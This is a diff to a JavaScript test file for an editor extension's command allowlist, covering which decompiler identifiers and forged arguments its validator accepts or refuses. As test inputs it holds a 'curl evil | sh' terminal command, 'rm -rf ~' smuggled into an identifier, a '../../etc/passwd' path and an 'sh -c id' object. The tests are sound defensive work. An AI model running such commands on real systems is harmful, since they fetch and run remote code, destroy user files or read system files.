@@ -3,7 +3,7 @@
 const { expect } = require('chai');
 const sinon = require('sinon');
 const proxyquire = require('proxyquire').noCallThru();
-const { ALLOWED_HUB_COMMANDS, checkHubCommand } = require('../static/hubCommandPolicy');
+const { ALLOWED_HUB_COMMANDS, MAX_DECOMPILER_ID_LENGTH, checkHubCommand } = require('../static/hubCommandPolicy');
 
 const DANGEROUS_REQUESTS = [
   ['send a shell command to the terminal', 'workbench.action.terminal.sendSequence', [{ text: 'curl evil | sh\n' }]],
@@ -47,15 +47,20 @@ describe('hub command policy (#535)', () => {
     }
   });
 
+  it('keeps every identifier the wizard or a hand-edited decompilers.json can produce', () => {
+    // Only a lookup key in the user's own configuration: never executed.
+    for (const id of ['a'.repeat(65), 'my_tool-2', 'Binja.Pro', 'outil maison']) {
+      expect(checkHubCommand('pileOuFace.decompilerTest', [id]), id).to.deep.equal({ ok: true, args: [id] });
+    }
+  });
+
   const BAD_ARGS = [
     ['an object', [{ command: ['sh', '-c', 'x'] }]],
     ['two identifiers', ['ghidra', 'retdec']],
-    ['a path', ['../../etc/passwd']],
-    ['shell metacharacters', ['ghidra; rm -rf ~']],
-    ['spaces', ['my tool']],
     ['an empty string', ['']],
+    ['a control character', ['ghidra\nrm -rf ~']],
     ['a number', [42]],
-    ['an over-long id', ['a'.repeat(65)]],
+    ['an oversized payload', ['a'.repeat(MAX_DECOMPILER_ID_LENGTH + 1)]],
   ];
   for (const [label, args] of BAD_ARGS) {
     it(`refuses ${label} as decompiler argument`, () => {
@@ -117,9 +122,16 @@ describe('hubExecuteCommand handler (#535)', () => {
 
   it('never runs an allowed command with forged arguments', async () => {
     const { handlers, executeCommand, posted } = makeHandlers();
-    await handlers.hubExecuteCommand({ command: 'pileOuFace.decompilerTest', requestId: 'r2', args: ['x; y'] });
+    await handlers.hubExecuteCommand({ command: 'pileOuFace.decompilerTest', requestId: 'r2', args: [{ command: ['sh', '-c', 'id'] }] });
     expect(executeCommand.called).to.equal(false);
     expect(posted[0]).to.include({ status: 'error' });
+  });
+
+  it('answers an empty command with a logged refusal', async () => {
+    const { handlers, executeCommand, posted } = makeHandlers();
+    await handlers.hubExecuteCommand({ command: '  ', requestId: 'r4' });
+    expect(executeCommand.called).to.equal(false);
+    expect(posted[0]).to.include({ type: 'hubCommandResult', requestId: 'r4', status: 'error' });
   });
 
   it('runs an allowed command with its validated arguments', async () => {
